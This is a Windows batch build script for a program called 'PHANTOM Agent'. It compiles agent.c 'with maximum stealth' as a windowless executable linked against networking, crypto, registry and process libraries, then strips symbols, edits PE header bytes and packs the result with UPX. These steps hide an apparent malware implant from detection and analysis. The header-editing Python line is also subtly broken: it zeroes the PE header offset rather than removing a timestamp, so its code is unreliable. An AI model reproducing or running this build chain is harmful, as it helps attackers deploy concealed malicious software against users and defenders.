@echo off
echo ========================================
echo Building PHANTOM Agent - Extraordinary Edition
echo ========================================
echo system version 1.1.1

REM Compile with maximum stealth
gcc agent.c -o phantom.exe ^
    -O2 -s -static -mwindows ^
    -ffunction-sections -fdata-sections ^
    -Wl,--gc-sections -Wl,--strip-all ^
    -Wl,--dynamicbase -Wl,--nxcompat ^
    -lws2_32 -lgdi32 -luser32 -ladvapi32 -lshell32 -lcrypt32 -lntdll -lpsapi

REM Strip everything
strip --strip-all phantom.exe

REM Remove PE timestamp and metadata
echo Removing PE metadata...
python -c "import sys; d=open('phantom.exe','rb').read(); open('phantom.exe','wb').write(d[:0x3c]+b'\x00\x00\x00\x00'+d[0x40:])" 2>nul

REM Pack with UPX
upx --best --ultra-brute phantom.exe

echo.
echo ========================================
echo Build Complete!
echo Output: phantom.exe
echo ========================================
dir phantom.exe
